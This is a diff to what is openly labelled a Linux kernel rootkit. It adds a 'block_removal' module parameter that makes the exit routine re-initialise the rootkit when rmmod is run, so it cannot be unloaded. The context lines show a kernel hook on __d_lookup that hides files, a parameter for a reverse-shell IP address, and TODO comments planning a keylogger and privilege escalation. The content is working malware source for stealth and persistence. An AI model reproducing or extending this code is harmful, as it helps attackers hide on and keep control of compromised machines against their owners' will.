@@ -57,6 +57,9 @@ struct commands cmds;
  * intermittently and do things when it changes.
  **/
 
+static bool block_removal = false;
+module_param(block_removal, bool, 0770);
+MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
 static char *rev_shell_ip = NULL;
 module_param(rev_shell_ip, charp, 0770);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
@@ -149,7 +152,7 @@ KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr 
 struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name) {
     if (should_hide_file(name->name)) {
         return NULL;
-	}
+    }
     return KHOOK_ORIGIN(__d_lookup, parent, name);
 }
 
@@ -209,9 +212,9 @@ static void poll_for_commands(unsigned long data) {
         // TODO: Set up reverse shell.
     }
 
-	// TODO: Check for change in hidden file hiding
-	// TODO: Check for keylogger enabling
-	// TODO: Check for escalating to root privs.
+    // TODO: Check for change in hidden file hiding
+    // TODO: Check for keylogger enabling
+    // TODO: Check for escalating to root privs.
     set_timer(&polling_timer);
 }
 
@@ -241,12 +244,20 @@ static int __init rootkit_init(void) {
 }
 
 /**
- * Called at exit. All cleanup should be done here.
+ * Called when $ rmmod is executed. If block_removal is toggled on, this
+ * function stops the rootkit from being removed. If it is not enabled,
+ * the rootkit is cleaned up nicely.
  */
 static void __exit rootkit_exit(void) {
-    printk(KERN_INFO "Cleaning up rootkit.\n");
-    khook_cleanup();
-    timer_cleanup_wrapper(&polling_timer);
+	printk(KERN_INFO "rmmod called. Cleaning up rootkit.");
+	if (block_removal) {
+		printk(KERN_INFO "Just kidding. This sounds like a good time to reinstall your OS.");
+		rootkit_init();
+	} else {
+		khook_cleanup();
+		timer_cleanup_wrapper(&polling_timer);
+	}
+
 }
 
 module_init(rootkit_init);
